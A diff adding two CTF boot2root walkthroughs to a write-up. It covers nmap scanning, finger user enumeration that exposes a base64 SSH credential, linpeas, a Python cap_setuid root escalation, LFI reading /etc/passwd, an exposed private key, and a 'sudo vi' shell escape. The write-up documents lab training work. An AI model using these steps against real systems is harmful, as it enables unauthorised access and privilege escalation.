@@ -336,10 +336,167 @@ using the signature we can find the RSA key/fingerprint of the pgp signature and
 🚩~flag found~🚩
 
 ## Chess Industry (Boot2root 1)
-coming soon...
+![](https://i.imgur.com/FnOa7D4.png)
+
+### What is the content of user.txt?
+Scanning the ip:
+```
+$> nmap -sS -p- -O -sV 10.10.151.237
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-29 16:08 EDT
+Nmap scan report for 10.10.151.237
+Host is up (0.071s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+79/tcp open  finger  Debian fingerd
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+Device type: general purpose
+Running: Linux 4.X
+OS CPE: cpe:/o:linux:linux_kernel:4.15
+OS details: Linux 4.15
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 55.19 seconds
+
+```
+
+visiting the site show a simple page with no hidden comments or html and no backend requests:
+![](https://i.imgur.com/wA2o5CJ.png)
+
+The scan show the `finger` protocol open on port 79 - `The finger protocol, an older internet protocol designed to retrieve information about users on a remote computer. It's primarily used to show who is logged in and potentially some basic details about their session.`
+So we can use it to find more information about the users of that machine:
+```
+$> finger magnus@10.10.151.237
+Login: magnus                           Name: 
+Directory: /home/magnus                 Shell: /bin/bash
+Never logged in.
+No mail.
+No Plan.
+
+$> finger fabiano@10.10.151.237 
+Login: fabiano                          Name: 
+Directory: /home/fabiano                Shell: /bin/bash
+Never logged in.
+No mail.
+Project:
+Reminders
+Plan:
+ZmFiaWFubzpvM2pWVGt0YXJHUUkwN3E=
+
+$> finger hikaru@10.10.151.237                                                      
+Login: hikaru                           Name: 
+Directory: /home/hikaru                 Shell: /bin/bash
+Never logged in.
+No mail.
+Project:
+http://localhost
+Plan:
+Working on AI chess bot for King's Square Chess Club.
+```
+Using the names from the main page gave us a foothold, using CyberChef for the base64 message from the `fabiano` user we decode a username and password for the ssh service and after login we found the first flag:
+![](https://i.imgur.com/12aMFd1.png)
+```
+$> ssh fabiano@10.10.151.237 
+fabiano@10.10.151.237's password:*********
+```
+![](https://i.imgur.com/PKiFsaL.png)
+
+🚩~flag found~🚩
+
+### What is the content of root.txt?
+using `linpeas (https://github.com/peass-ng/PEASS-ng)` to find a way to escalate our privileges, first getting the script to the attacker machine and copy it to the target machine:
+```
+$> wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+
+$> scp linpeas.sh fabiano@10.10.151.237:/
+```
+and running the script on the target:
+```
+fabiano@tryhackme-2204:~$ chmod +x linpeas.sh 
+fabiano@tryhackme-2204:~$ ./linpeas.sh 
+```
+`linpeas` found a high lever PE (Privilege Escalation) vector:
+![](https://i.imgur.com/zWbFffv.png)
+
+Normally, Python runs as user. But with `cap_setuid=ep`, it can switch to **any UID** — including **root (UID 0)**.
+
+alternative way to find this is to use `getcap`:
+```
+$> getcap -r / 2>/dev/null
+```
+
+with that we can get a root privilege by using python to set uid to 0 (root) and spawn a shell:
+![](https://i.imgur.com/FyYz3yR.png)
+
+🚩~flag found~🚩
 
 ## Under Construction (Boot2Root 2)
-coming soon...
+![](https://i.imgur.com/NZfWxf6.png)
+
+### What is the content of user.txt?
+First let's scan the machine:
+```
+$> nmap -sS -p- -O -sV 10.10.8.113  
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-29 16:23 EDT
+Nmap scan report for 10.10.8.113
+Host is up (0.073s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
+Device type: general purpose
+Running: Linux 4.X
+OS CPE: cpe:/o:linux:linux_kernel:4.15
+OS details: Linux 4.15
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 55.11 seconds
+```
+
+Vising the site show a simple site, by changing the pages we can see a potential LFI (Local File Inclusion).
+![](https://i.imgur.com/QvKEyC6.png)
+![](https://i.imgur.com/d1SxHuO.png)
+
+using ffuf to uncover hidden paths found /keys/ and inside the folder we can see that `key_09` have some data, opening it show a private openssh key:
+![](https://i.imgur.com/XOl6PoL.png)
+![](https://i.imgur.com/qJtFwhl.png)
+![](https://i.imgur.com/jvPv1ed.png)
+
+Now that we have a key, we need a user to use it with on the ssh, using the LFI from the webserver we can find the `passwd` file, and from it get the user: `dev`:
+![](https://i.imgur.com/1WmZ5SF.png)
+
+using the user:`dev` and the openssh key let us connect to the machine using ssh:
+```
+$> ssh -i key_09 dev@10.10.8.113
+```
+![](https://i.imgur.com/T3r7CYz.png)
+
+🚩~flag found~🚩
+
+### What is the content of root.txt?
+using `sudo -l` to list which commands we are allowed to execute as root:
+![](https://i.imgur.com/02pkanP.png)
+
+we can run `vi` as root, and using vi to spawn a shell we can get a root:
+```
+$> sudo /usr/bin/vi
+```
+inside vi:
+```
+:!bash
+```
+This will open a shell (`bash`) running as root.
+Alternatively, if `bash` isn’t available, we can try:
+```
+:!sh
+```
+![](https://i.imgur.com/XLB65x6.png)
+
+🚩~flag found~🚩
 
 ## No Salt, No Shame (Crypto 1)
 coming soon...
